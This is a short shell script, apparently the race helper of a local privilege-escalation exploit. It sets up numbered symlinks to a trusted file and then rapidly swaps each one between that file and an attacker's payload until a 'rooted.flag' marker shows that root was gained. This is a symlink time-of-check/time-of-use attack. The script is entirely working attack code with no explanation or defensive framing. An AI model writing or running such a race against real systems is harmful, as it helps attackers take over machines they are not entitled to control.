#!/bin/sh
BASE="$1"
MAX="$2"
TRUSTED="$3"
PAYLOAD="$4"
LOG="$BASE/helper.log"
echo "shell flipper start max=$MAX" >>"$LOG"
i=0
while [ "$i" -lt "$MAX" ]; do
    if ! ln -s "$TRUSTED" "$BASE/k3u${i}_t" 2>>"$LOG" ||
       ! mv -fT "$BASE/k3u${i}_t" "$BASE/k3u$i" 2>>"$LOG"; then
        echo "prealloc fatal at $i" >>"$LOG"
        echo "prealloc failed at $i" >"$BASE/helper.error"
        exit 1
    fi
    i=$((i + 1))
done
echo "$$" >"$BASE/helper.ready"
echo "preallocated $MAX unique links" >>"$LOG"
idx=0
n=0
t=0
errors=0
while [ ! -f "$BASE/rooted.flag" ] && [ ! -f "$BASE/stop.flag" ]; do
    next=$((idx + 1))
    if [ "$next" -lt "$MAX" ] && [ -e "$BASE/k3c$next" ]; then
        idx="$next"
    fi
    if [ "$t" -eq 0 ]; then target="$TRUSTED"; else target="$PAYLOAD"; fi
    if ln -s "$target" "$BASE/k3u${idx}_t" 2>/dev/null &&
       mv -fT "$BASE/k3u${idx}_t" "$BASE/k3u$idx" 2>/dev/null; then
        errors=0
    else
        errors=$((errors + 1))
        if [ "$errors" -gt 1000 ]; then
            echo "flip failed repeatedly" >"$BASE/helper.error"
            exit 1
        fi
    fi
    t=$((1 - t))
    n=$((n + 1))
done
echo 1 >"$BASE/helper.done"
echo "shell flipper exiting" >>"$LOG"
